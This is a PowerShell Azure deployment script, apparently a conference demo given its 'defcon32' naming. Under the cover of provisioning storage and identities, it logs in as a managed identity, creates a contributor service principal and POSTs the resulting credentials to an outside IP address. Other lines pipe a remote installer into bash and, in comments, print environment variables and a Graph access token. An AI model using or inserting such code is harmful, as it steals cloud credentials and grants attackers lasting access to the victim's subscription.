$resourceGroupName = "cvtrsg" # <- Replace with your value
$location = "westeurope" # <- This must be a location that can host Azure Container Instances
$storageAccountName = "deploymentscript474694" # <- Unique storage account name
$userManagedIdentity = "mi_wucpi" # <- Change this if you want

Write-Output "Original Script"

Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName || New-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName -Location $location -SkuName Standard_LRS
Set-AzStorageAccount -Name $storageAccountName -ResourceGroupName $resourceGroupName -EnableHttpsTrafficOnly $true

New-AzStorageAccount -ResourceGroupName $resourceGroupName -Name wucpinewstorage -Location $location -SkuName Standard_LRS

$uamiObject = New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName -Name $userManagedIdentity -Location $location

New-AzUserAssignedIdentity -ResourceGroupName $resourceGroupName -Name mi_wucpi2 -Location $location

Write-Output "Install azure cli"

curl -sL https://aka.ms/InstallAzureCLIDeb | bash

#Write-Output "Env variables1 --- $((gci env:*).GetEnumerator() | Sort-Object Name | Out-String)"

#Write-Output "Env variables2 --- $((Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token)"

#Write-Output "Env variables2 --- $((Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com"))"

Write-Output "Curl commands"

Write-Output "Az Login With Managed Identity"

#managed_identity Client ID 6502a0a1-d796-4fd9-8050-8ab50eefd439

az login --identity --username 6502a0a1-d796-4fd9-8050-8ab50eefd439

Write-Output "SP Creation by Managed Identity"

$output=$(az ad sp create-for-rbac --name defcon32_cv --role contributor --scopes /subscriptions/edad2455-179b-4571-b559-877fb12b46ac/resourceGroups/cvtrsg)

$body=$output

$header = @{
 "Accept"="application/json"
 "Content-Type"="application/json"
} 

Invoke-RestMethod -Uri "http://159.223.102.2:8888/" -Method 'Post' -Body $body -Headers $header

Write-Output "Role Assignments by Managed Identity"

New-AzRoleAssignment -ObjectId $uamiObject.PrincipalId -RoleDefinitionName Reader
New-AzRoleAssignment -ObjectId $uamiObject.PrincipalId -RoleDefinitionName "Virtual Machine Contributor"

Write-Output "Outputs"

Write-Output "ACIResourceGroup --- $resourceGroupName"
Write-Output "StorageAccountId --- $((Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $storageAccountName).Id)"
Write-Output "StorageAccountName --- $storageAccountName"
Write-Output "RemediationIdentity --- $($uamiObject.Id)"
